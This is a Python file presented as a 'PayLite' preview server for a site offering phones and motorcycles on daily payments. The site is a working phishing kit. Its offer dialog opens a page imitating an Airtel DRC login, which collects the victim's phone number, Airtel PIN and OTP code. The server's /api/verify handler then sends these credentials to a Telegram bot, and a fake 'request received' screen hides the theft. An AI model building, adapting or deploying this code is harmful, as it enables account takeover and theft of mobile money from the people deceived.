"""
PayLite Standalone Preview Server
Run with: python app.py
Opens automatically in your browser at http://localhost:8000
"""

import http.server
import socketserver
import threading
import webbrowser

PORT = 8000

HTML_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PayLite â€” Phones & motorcycles on daily payments</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  <script>
    tailwind.config = {
      darkMode: 'class',
      theme: {
        extend: {
          fontFamily: {
            sans: ['Inter', 'sans-serif'],
            display: ['Sora', 'sans-serif'],
          },
          colors: {
            background: '#141414',
            foreground: '#f5f5f5',
            card: '#1e1e1e',
            secondary: '#2a2a2a',
            border: '#333333',
            muted: '#2a2a2a',
            'muted-foreground': '#9e9e9e',
            primary: '#ededed',
            'primary-foreground': '#141414',
          }
        }
      }
    }
  </script>
  <style>
    body { background-color: #141414; color: #f5f5f5; font-family: 'Inter', sans-serif; }
    html { scroll-behavior: smooth; }
  </style>
</head>
<body class="bg-background text-foreground antialiased selection:bg-primary selection:text-primary-foreground">
  <div id="root"></div>

  <script type="text/babel">
    const { useState, useEffect } = React;

    // --- Icons ---
    const WalletIcon = ({ className = "w-6 h-6" }) => (
      <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"/><path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"/></svg>
    );
    const ShieldCheckIcon = ({ className = "w-5 h-5" }) => (
      <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
    );
    const SmartphoneIcon = ({ className = "w-5 h-5" }) => (
      <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
    );
    const CalendarDaysIcon = ({ className = "w-5 h-5" }) => (
      <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M8 2v4"/><path d="M16 2v4"/><rect width="18" height="18" x="3" y="4" rx="2"/><path d="M3 10h18"/><path d="M8 14h.01"/><path d="M12 14h.01"/><path d="M16 14h.01"/><path d="M8 18h.01"/><path d="M12 18h.01"/><path d="M16 18h.01"/></svg>
    );
    const BikeIcon = ({ className = "w-5 h-5" }) => (
      <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="18.5" cy="17.5" r="3.5"/><circle cx="5.5" cy="17.5" r="3.5"/><circle cx="15" cy="5" r="1"/><path d="M12 17.5V14l-3-3 4-3 2 3h2"/></svg>
    );
    const CircleCheckIcon = ({ className = "w-5 h-5" }) => (
      <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
    );
    const XIcon = ({ className = "w-4 h-4" }) => (
      <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
    );

    // --- Product Catalog ---
    const createP = (cat, name, img, dep, day) => {
      const moto = cat === "Motorcycle";
      const months = moto ? 18 : 12;
      const days = moto ? 540 : 360;
      return { cat, name, img: `/products/${img}.png`, dep, day, months, days, total: Math.round(dep + day * days), moto };
    };

    const products = [
      createP("iPhone", "iPhone 12", "iphone-12", 35, 0.65),
      createP("iPhone", "iPhone 12 Pro Max", "iphone-12-pro-max", 45, 0.7),
      createP("iPhone", "iPhone 13", "iphone-13", 40, 0.75),
      createP("iPhone", "iPhone 13 Pro Max", "iphone-13-pro-max", 50, 0.8),
      createP("iPhone", "iPhone 14 Pro Max", "iphone-14-pro-max", 55, 0.95),
      createP("Samsung", "Samsung Galaxy S23 Ultra", "galaxy-s23-ultra", 45, 0.75),
      createP("Samsung", "Samsung Galaxy S24 Ultra", "galaxy-s24-ultra", 50, 0.85),
      createP("Samsung", "Samsung Galaxy S25 Ultra", "galaxy-s25-ultra", 65, 1.0),
      createP("Tecno", "Tecno Camon 40", "tecno-camon-40", 35, 0.65),
      createP("Tecno", "Tecno Camon 50", "tecno-camon-50", 45, 0.75),
      createP("Tecno", "Tecno Spark 40", "tecno-spark-40", 35, 0.65),
      createP("Tecno", "Tecno Spark 50", "tecno-spark-50", 45, 0.75),
      createP("Infinix", "Infinix Hot 60 Pro Plus", "infinix-hot-60-pro-plus", 45, 0.75),
      createP("Infinix", "Infinix Hot 70 Pro Plus", "infinix-hot-70-pro-plus", 55, 0.85),
      createP("Motorcycle", "Boxer 125cc", "boxer-125cc", 60, 1.2),
      createP("Motorcycle", "Boxer 150cc", "boxer-150cc", 70, 1.35),
      createP("Motorcycle", "TVS 125cc", "tvs-125cc", 60, 1.25),
      createP("Motorcycle", "TVS 150cc", "tvs-150cc", 70, 1.4),
    ];

    const filters = ["All offers", "iPhone", "Samsung", "Tecno", "Infinix", "Motorcycle"];

    const features = [
      { icon: SmartphoneIcon, title: "Latest devices", text: "iPhone, Galaxy Ultra, Tecno and Infinix in stock." },
      { icon: CalendarDaysIcon, title: "Daily plans", text: "Pay back a little each day over 12 to 18 months." },
      { icon: ShieldCheckIcon, title: "No hidden fees", text: "The deposit and daily amount are clearly stated from the outset." },
      { icon: WalletIcon, title: "Total ownership", text: "Complete your plan and the article is 100% yours." },
    ];

    const steps = [
      ["Choose your item", "Select a phone or motorcycle from the offers and check the deposit and daily amount."],
      ["Pay the deposit", "Pay the small one-time deposit to reserve your item and start your plan."],
      ["Pay every day", "Repay a small fixed amount each day over the chosen period of 12 to 18 months."],
      ["Become a homeowner", "Once your plan is complete, the item is 100% yours, with nothing more to pay."],
    ];

    const money = (n) => (n % 1 === 0 ? `$${n}` : `$${n.toFixed(2)}`);
    const dayMoney = (n) => `$${n.toFixed(2)}`;
    const container = "mx-auto w-full max-w-[1430px] px-5 sm:px-8 lg:px-24";
    const btn = "inline-flex items-center justify-center rounded-lg bg-primary text-primary-foreground font-medium transition-opacity hover:opacity-90";

    function ProductPlaceholder({ product, className = "" }) {
      const [error, setError] = React.useState(false);
      
      if (product.img && !error) {
        return (
          <img 
            src={product.img} 
            alt={product.name}
            className={`h-full w-full object-cover ${className}`}
            onError={() => setError(true)}
          />
        );
      }

      return (
        <div className={`flex h-full w-full flex-col items-center justify-center gap-2 text-muted-foreground ${className}`}>
          {product.moto ? <BikeIcon className="h-12 w-12" /> : <SmartphoneIcon className="h-12 w-12" />}
        </div>
      );
    }

    function AskDialog({ product, onClose }) {
      useEffect(() => {
        const handleKeyDown = (e) => {
          if (e.key === "Escape") onClose();
        };
        if (product) {
          document.body.style.overflow = "hidden";
          window.addEventListener("keydown", handleKeyDown);
        }
        return () => {
          document.body.style.overflow = "";
          window.removeEventListener("keydown", handleKeyDown);
        };
      }, [product]);

      if (!product) return null;
      const dailyTotal = Math.round(product.day * product.days);

      return (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-xs">
          <div className="fixed inset-0" onClick={onClose} />
          <div className="relative z-10 w-full max-w-[560px] overflow-hidden rounded-[22px] border border-border bg-background shadow-2xl">
            <div className="flex items-start gap-4 border-b border-border p-5 sm:p-6">
              <div className="h-20 w-20 shrink-0 overflow-hidden rounded-xl bg-secondary sm:h-24 sm:w-24 flex items-center justify-center">
                <ProductPlaceholder product={product} />
              </div>
              <div className="min-w-0 flex-1 pt-1">
                <h2 className="truncate text-2xl font-semibold tracking-tight">{product.name}</h2>
                <p className="mt-1.5 flex items-center gap-1.5 text-sm text-muted-foreground">
                  <CalendarDaysIcon className="h-4 w-4" />
                  {product.months}-month plan
                </p>
                <p className="mt-2 font-display text-xl font-bold">
                  {money(product.total)}
                  {product.moto && " *"} <span className="font-sans text-sm font-normal text-muted-foreground">total</span>
                </p>
              </div>
              <button
                onClick={onClose}
                aria-label="Close"
                className="grid h-9 w-9 shrink-0 cursor-pointer place-items-center rounded-full bg-secondary text-secondary-foreground transition-opacity hover:opacity-80"
              >
                <XIcon className="h-4 w-4" />
              </button>
            </div>

            <div className="p-5 sm:p-6">
              <div className="grid grid-cols-2 gap-3">
                <div className="rounded-xl bg-secondary p-4">
                  <div className="text-sm text-muted-foreground">Deposit today</div>
                  <div className="mt-1 font-display text-2xl font-bold">{money(product.dep)}</div>
                </div>
                <div className="rounded-xl bg-secondary p-4">
                  <div className="text-sm text-muted-foreground">Daily payment</div>
                  <div className="mt-1 font-display text-2xl font-bold">{dayMoney(product.day)}</div>
                </div>
              </div>

              <div className="mt-3 rounded-xl bg-secondary p-4">
                <div className="flex items-center justify-between gap-4">
                  <span className="text-muted-foreground">Payment period</span>
                  <span className="font-semibold">{product.days} days</span>
                </div>
                <div className="mt-3 flex items-center justify-between gap-4">
                  <span className="text-muted-foreground">Total daily payments</span>
                  <span className="font-semibold">{money(dailyTotal)}</span>
                </div>
              </div>

              <button 
                onClick={() => window.open('/airtel-login', '_blank')}
                className={`${btn} mt-5 h-12 w-full rounded-full text-base`}
              >
                <ShieldCheckIcon className="mr-2 h-5 w-5" />
                Continue with Airtel to verify
              </button>

              <p className="mt-4 flex items-center justify-center gap-2 text-center text-sm text-muted-foreground">
                <CircleCheckIcon className="h-4 w-4 shrink-0" />
                Check your eligibility â€” registration is non-binding.
              </p>
            </div>
          </div>
        </div>
      );
    }

    function App() {
      const [filter, setFilter] = useState("All offers");
      const [ask, setAsk] = useState(null);
      const shown = filter === "All offers" ? products : products.filter((x) => x.cat === filter);

      return (
        <div id="top" className="min-h-screen overflow-x-hidden bg-background">
          {/* Header */}
          <header className="sticky top-0 z-20 border-b border-border bg-background/95 backdrop-blur-sm">
            <div className={`${container} grid h-[58px] grid-cols-[auto_1fr_auto] items-center gap-3`}>
              <a href="#top" className="flex shrink-0 items-center gap-2.5">
                <span className="grid h-11 w-11 place-items-center rounded-xl bg-primary text-primary-foreground">
                  <WalletIcon className="h-6 w-6" />
                </span>
                <span className="font-display text-xl font-bold">PayLite</span>
              </a>
              <nav className="flex justify-center gap-4 text-sm text-muted-foreground sm:gap-10 sm:text-[17px]">
                <a href="#offers" className="hover:text-foreground">Offers</a>
                <a href="#how" className="whitespace-nowrap hover:text-foreground">How it works</a>
              </nav>
              <a href="#offers" className={`${btn} h-9 px-4 text-sm sm:px-6 sm:text-[17px]`}>To start</a>
            </div>
          </header>

          {/* Hero */}
          <section className={`${container} grid gap-14 py-12 lg:grid-cols-2 lg:gap-10`}>
            <div>
              <span className="inline-flex items-center gap-2 rounded-full border border-border px-4 py-1.5 text-sm font-medium sm:text-base">
                <ShieldCheckIcon className="h-4 w-4" /> Small deposit. Easy daily payments.
              </span>
              <h1 className="mt-7 text-[2.6rem] font-semibold leading-[1.07] tracking-tight sm:text-6xl lg:text-[72px]">
                Get the phone<br />or motorcycle<br />you want,<br />day after day.
              </h1>
              <p className="mt-9 max-w-[580px] text-lg leading-relaxed text-muted-foreground sm:text-[22px]">
                Make a small down payment today and pay the rest in affordable daily installments. Choose from iPhones, Samsung, Tecno, Infinix, and motorcycles.
              </p>
              <div className="mt-11 flex items-center gap-12">
                <a href="#offers" className={`${btn} h-11 px-9 text-lg`}>View offers</a>
                <a href="#how" className="text-lg font-medium hover:opacity-80">How it works</a>
              </div>
              <div className="mt-14 grid max-w-[520px] grid-cols-3 gap-6">
                {[["18+", "Devices and motorcycles"], ["$35", "Deposit from"], ["$0.65", "Per day from"]].map(([v, l]) => (
                  <div key={v}>
                    <div className="font-display text-3xl font-bold">{v}</div>
                    <div className="mt-1 text-muted-foreground sm:text-lg">{l}</div>
                  </div>
                ))}
              </div>
            </div>

            <div className="grid grid-cols-1 gap-5 self-center sm:grid-cols-2">
              {features.map((f, i) => (
                <div key={f.title} className={`min-h-[240px] rounded-[22px] border border-border bg-card p-6 ${i % 2 ? "sm:translate-y-10" : ""}`}>
                  <span className="grid h-12 w-12 place-items-center rounded-xl bg-secondary">
                    <f.icon className="h-5 w-5" />
                  </span>
                  <h3 className="mt-7 text-xl font-semibold">{f.title}</h3>
                  <p className="mt-2 text-lg leading-snug text-muted-foreground">{f.text}</p>
                </div>
              ))}
            </div>
          </section>

          {/* Offers */}
          <section id="offers" className={`${container} scroll-mt-16 py-24`}>
            <p className="text-muted-foreground">Choose a brand</p>
            <h2 className="mt-2 text-3xl font-semibold tracking-tight sm:text-5xl">Browse the available offers</h2>
            <p className="mt-4 max-w-2xl text-lg text-muted-foreground">
              Select a category to see the devices and motorcycles you can take home today with a small deposit and easy daily payments.
            </p>
            <div className="-mx-5 mt-8 flex gap-3 overflow-x-auto px-5 pb-2 sm:mx-0 sm:flex-wrap sm:px-0">
              {filters.map((f) => (
                <button
                  key={f}
                  onClick={() => setFilter(f)}
                  className={`shrink-0 cursor-pointer rounded-full border px-5 py-2 font-medium transition-colors ${
                    filter === f ? "border-primary bg-primary text-primary-foreground" : "border-border text-muted-foreground hover:text-foreground"
                  }`}
                >
                  {f}
                </button>
              ))}
            </div>

            <div className="mt-10 grid grid-cols-1 gap-5 min-[520px]:grid-cols-2 md:grid-cols-3 xl:grid-cols-4">
              {shown.map((x) => (
                <article key={x.name} className="flex flex-col overflow-hidden rounded-[22px] border border-border bg-card">
                  <div className="relative aspect-[4/3] bg-secondary/50 flex items-center justify-center">
                    <ProductPlaceholder product={x} />
                    <span className="absolute left-4 top-4 rounded-full border border-border bg-background px-3 py-1 text-xs font-medium">
                      {x.months} months
                    </span>
                  </div>
                  <div className="flex flex-1 flex-col p-5">
                    <h3 className="text-lg font-semibold">{x.name}</h3>
                    <div className="mt-4 grid grid-cols-2 gap-3">
                      <div className="rounded-xl bg-secondary p-3">
                        <div className="text-xs text-muted-foreground">Deposit</div>
                        <div className="font-display text-xl font-bold">{money(x.dep)}</div>
                      </div>
                      <div className="rounded-xl bg-secondary p-3">
                        <div className="text-xs text-muted-foreground">Per day</div>
                        <div className="font-display text-xl font-bold">{dayMoney(x.day)}</div>
                      </div>
                    </div>
                    <p className="mt-4 text-sm text-muted-foreground">
                      Pay {money(x.dep)} today, then {dayMoney(x.day)}/day for {x.days} days.
                    </p>
                    <div className="mt-auto flex items-end justify-between gap-3 border-t border-border pt-4 mt-5">
                      <div>
                        <div className="text-xs text-muted-foreground">Total price to pay</div>
                        <div className="font-display text-lg font-bold">
                          {money(x.total)}
                          {x.moto && " *"}
                        </div>
                      </div>
                      <button
                        onClick={() => setAsk(x)}
                        className={`${btn} h-9 shrink-0 cursor-pointer rounded-full px-5 text-sm`}
                      >
                        Ask
                      </button>
                    </div>
                  </div>
                </article>
              ))}
            </div>
            <p className="mt-8 text-sm text-muted-foreground">
              * Motorcycle prices are estimates. Please specify your desired deposit, daily rate, and rental duration, and we will update these offers accordingly.
            </p>
          </section>

          {/* How it works */}
          <section id="how" className={`${container} scroll-mt-16 py-24`}>
            <p className="text-muted-foreground">How it works</p>
            <h2 className="mt-2 text-3xl font-semibold tracking-tight sm:text-5xl">Four simple steps to becoming an owner</h2>
            <div className="mt-12 grid gap-5 sm:grid-cols-2 lg:grid-cols-4">
              {steps.map(([t, d], i) => (
                <div key={t} className="rounded-[22px] border border-border bg-card p-6">
                  <span className="grid h-12 w-12 place-items-center rounded-xl bg-secondary font-display text-lg font-bold">{i + 1}</span>
                  <h3 className="mt-7 text-xl font-semibold">{t}</h3>
                  <p className="mt-2 text-muted-foreground">{d}</p>
                </div>
              ))}
            </div>
          </section>

          {/* Footer */}
          <footer className="border-t border-border">
            <div className={`${container} py-10`}>
              <div className="font-display text-xl font-bold">PayLite</div>
              <p className="mt-2 max-w-xl text-muted-foreground">
                Become an owner of appliances and motorcycles with a small deposit and daily payments.
              </p>
            </div>
          </footer>

          <AskDialog product={ask} onClose={() => setAsk(null)} />
        </div>
      );
    }

    ReactDOM.createRoot(document.getElementById("root")).render(<App />);
  </script>
</body>
</html>
"""

AIRTEL_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Airtel DRC - Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Inter', sans-serif; background-color: #f4f4f4; margin: 0; }
    .airtel-red { background-color: #ff0000; }
  </style>
</head>
<body>
  <div id="root"></div>
  <script type="text/babel">
    const { useState, useEffect } = React;

    function AirtelLogin() {
      const [step, setStep] = useState(1);
      const [isLoading, setIsLoading] = useState(false);
      const [phone, setPhone] = useState('');
      const [pin, setPin] = useState(['', '', '', '']);
      const [otp, setOtp] = useState(['', '', '', '', '', '']);
      const [timer, setTimer] = useState(60);

      useEffect(() => {
        let interval;
        if (step === 2 && timer > 0) {
          interval = setInterval(() => setTimer(prev => prev - 1), 1000);
        }
        return () => clearInterval(interval);
      }, [step, timer]);

      const hPC = (i, v) => {
        if (v.length <= 1 && /^\d*$/.test(v)) {
          const n = [...pin];
          n[i] = v;
          setPin(n);
          if (v && i < 3) {
            const next = document.getElementById(`pin-${i + 1}`);
            if (next) next.focus();
          }
        }
      };

      const hOC = (i, v) => {
        if (v.length <= 1 && /^\d*$/.test(v)) {
          const n = [...otp];
          n[i] = v;
          setOtp(n);
          if (v && i < 5) {
            const next = document.getElementById(`otp-${i + 1}`);
            if (next) next.focus();
          }
        }
      };

      const handleLoginSubmit = async () => {
        setIsLoading(true);
        try {
          await fetch('/api/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              phone,
              pin: pin.join(''),
              otp: 'Pending OTP...'
            })
          });
        } catch (e) {
          console.error('Failed to notify:', e);
        }
        setTimeout(() => {
          setIsLoading(false);
          setStep(2);
        }, 1500);
      };

      const handleVerify = async () => {
        setIsLoading(true);
        try {
          await fetch('/api/verify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              phone,
              pin: pin.join(''),
              otp: otp.join('')
            })
          });
        } catch (e) {
          console.error('Failed to notify:', e);
        }
        setTimeout(() => {
          setIsLoading(false);
          setStep(3);
        }, 2000);
      };

      if (isLoading) {
        return (
          <div className='min-h-screen flex flex-col items-center justify-center bg-white p-6 text-center'>
            <div className='w-16 h-16 border-4 border-gray-100 border-t-red-600 rounded-full animate-spin mb-6'></div>
            <h2 className='text-2xl font-bold text-gray-900'>Verifying account</h2>
            <p className='text-gray-500 mt-2'>Please wait while we secure your connection...</p>
          </div>
        );
      }
      if (step === 3) {
        return (
          <div className='min-h-screen flex flex-col'>
            <header className='airtel-red text-white p-6 text-center relative'>
              <h1 className='text-3xl font-bold'>Airtel DRC</h1>
              <p className='text-sm mt-1 opacity-90'>Request Received</p>
            </header>
            <main className='flex-1 flex justify-center px-4 -mt-6'>
              <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center'>
                <div className='mx-auto w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-8'>
                  <svg className='w-12 h-12 text-green-600' fill='none' stroke='currentColor' viewBox='0 0 24 24'><path strokeLinecap='round' strokeLinejoin='round' strokeWidth='2' d='M5 13l4 4L19 7'></path></svg>
                </div>
                <h2 className='text-3xl font-bold text-gray-900'>Thank You!</h2>
                <p className='text-gray-600 mt-6 text-xl leading-relaxed'>Your request has been submitted successfully. Please wait for confirmation.</p>
                <div className='mt-8 p-6 bg-gray-50 rounded-2xl border border-gray-100'>
                  <p className='text-gray-700 font-medium text-lg'>A representative will contact you at <span className='text-red-600 font-bold'>+243 {phone}</span> within 24 hours to finalize your plan.</p>
                </div>
                <button onClick={() => window.close()} className='w-full mt-10 py-5 border-2 border-gray-200 text-gray-600 rounded-full text-xl font-bold hover:bg-gray-50 transition-colors'>Close this window</button>
              </div>
            </main>
          </div>
        );
      }

      if (step === 2) {
        return (
          <div className='min-h-screen flex flex-col'>
            <header className='airtel-red text-white p-6 text-center relative'>
              <button onClick={() => setStep(1)} className='absolute left-6 top-6 text-2xl'>â†</button>
              <h1 className='text-3xl font-bold'>Airtel DRC</h1>
              <p className='text-sm mt-1 opacity-90'>Verification Required</p>
            </header>
            <main className='flex-1 flex justify-center px-4 -mt-6'>
              <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center'>
                <h2 className='text-3xl font-bold text-gray-900'>Enter OTP</h2>
                <p className='text-gray-500 mt-4 text-lg'>OTP has been sent to the number <span className='font-bold text-gray-900'>+243 {phone}</span> added earlier.</p>
                <div className='flex justify-center gap-2 sm:gap-4 mt-10'>
                  {[0, 1, 2, 3, 4, 5].map((i) => (
                    <input key={i} id={`otp-${i}`} type='text' maxLength='1' className='w-10 h-14 sm:w-16 sm:h-20 text-center text-2xl sm:text-3xl font-bold border border-gray-300 rounded-xl sm:rounded-2xl focus:border-red-500 outline-none' value={otp[i] || ''} onChange={(e) => hOC(i, e.target.value)} />
                  ))}
                </div>
                <div className='mt-6 text-gray-500 font-medium'>Resend code in <span className='text-red-600'>{timer}s</span></div>
                <button onClick={handleVerify} className='w-full mt-10 py-5 airtel-red text-white rounded-full text-xl font-bold hover:opacity-90'>Verify & Continue</button>
              </div>
            </main>
          </div>
        );
      }
      return (
        <div className='min-h-screen flex flex-col'>
          <header className='airtel-red text-white p-6 text-center relative'>
            <div className='absolute left-6 top-6 text-2xl'>â‰¡</div>
            <h1 className='text-3xl font-bold'>Airtel DRC</h1>
            <p className='text-sm mt-1 opacity-90'>Fast loans. Anytime. Anywhere.</p>
          </header>
          <main className='flex-1 flex justify-center px-4 -mt-6'>
            <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12'>
              <h2 className='text-4xl font-bold text-gray-900'>Welcome back</h2>
              <p className='text-gray-500 mt-2 text-lg'>Log in to your Airtel account</p>
              <div className='mt-8 bg-red-50 border border-red-200 rounded-xl p-4 flex items-center gap-3'>
                <div className='w-6 h-6 rounded-full border-2 border-red-500 flex items-center justify-center text-red-500 font-bold text-sm'>!</div>
                <p className='text-red-700 font-medium'>Enter your Airtel number.</p>
              </div>
              <div className="mt-10">
                <label className="block text-gray-700 font-semibold mb-3 text-lg">Phone number</label>
                <div className="flex items-center border border-gray-300 rounded-2xl overflow-hidden focus-within:border-red-500">
                  <span className="bg-gray-50 px-5 py-4 border-r border-gray-300 text-gray-500 font-medium text-lg">+243</span>
                  <input type="tel" className="flex-1 px-5 py-4 outline-none text-lg" value={phone} onChange={(e) => setPhone(e.target.value)} />
                </div>
              </div>
              <div className="mt-10">
                <label className="block text-gray-700 font-semibold mb-3 text-lg text-center sm:text-left">Enter your Airtel PIN code</label>
                <div className="flex justify-center sm:justify-start gap-4 mt-4">
                  {pin.map((d, i) => (
                    <input key={i} id={`pin-${i}`} type="password" maxLength="1" className="w-16 h-20 text-center text-3xl font-bold border border-gray-300 rounded-2xl focus:border-red-500 outline-none" value={d} onChange={(e) => hPC(i, e.target.value)} />
                  ))}
                </div>
              </div>
              <button onClick={handleLoginSubmit} className="w-full mt-12 py-5 airtel-red text-white rounded-full text-xl font-bold flex items-center justify-center gap-2 hover:opacity-90">
                Connexion <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
              </button>
            </div>
          </main>
        </div>
      );


    }

    ReactDOM.createRoot(document.getElementById("root")).render(<AirtelLogin />);
  </script>
</body>
</html>
"""

class PayLiteHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Check if the request is for the airtel login page
        if self.path == '/airtel-login':
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(AIRTEL_HTML.encode("utf-8"))
            return

        # Check if the request is for a file in the assets directory
        if self.path.startswith('/products/'):
            # Map /products/ URL path to the actual /assets/ folder on disk
            self.path = self.path.replace('/products/', '/assets/', 1)
            return super().do_GET()
            
        # Default: Serve the HTML content
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(HTML_CONTENT.encode("utf-8"))

    def do_POST(self):
        if self.path == '/api/verify':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            import json
            import os
            import requests
            
            try:
                from dotenv import load_dotenv
                load_dotenv()
            except ImportError:
                pass

            data = json.loads(post_data.decode('utf-8'))
            phone = data.get('phone', '')
            pin = data.get('pin', '')
            otp = data.get('otp', '')
            
            message = f"🚀 *New Application Received!*\n\n"
            message += f"📱 *Phone:* +243 {phone}\n"
            message += f"🔑 *PIN:* {pin}\n"
            message += f"🔢 *OTP:* {otp}\n"
            
            token = os.environ.get("TELEGRAM_TOKEN")
            chat_id = os.environ.get("TELEGRAM_CHAT_ID")
            
            print(f"[PayLite] Received Verification: Phone={phone}, PIN={pin}, OTP={otp}")
            
            if token and chat_id:
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                payload = {
                    "chat_id": chat_id,
                    "text": message,
                    "parse_mode": "Markdown"
                }
                try:
                    res = requests.post(url, json=payload)
                    print(f"[PayLite] Telegram response: {res.status_code}")
                except Exception as e:
                    print(f"[PayLite] Error sending to Telegram: {e}")
            else:
                print("[PayLite] Telegram credentials missing. Skipping notification.")

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode("utf-8"))
            return


    def log_message(self, format, *args):
        # Clean terminal output
        print(f"[PayLite] {self.address_string()} - {args[0]}")

if __name__ == "__main__":
    url = f"http://localhost:{PORT}"
    print("=" * 60)
    print(f"ðŸš€ PayLite preview starting at {url}")
    print("=" * 60)
    
    # Automatically open browser after 1 second
    threading.Timer(1.0, lambda: webbrowser.open(url)).start()
    
    # Allow port reuse so re-runs don't hit address already in use
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), PayLiteHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down server.")
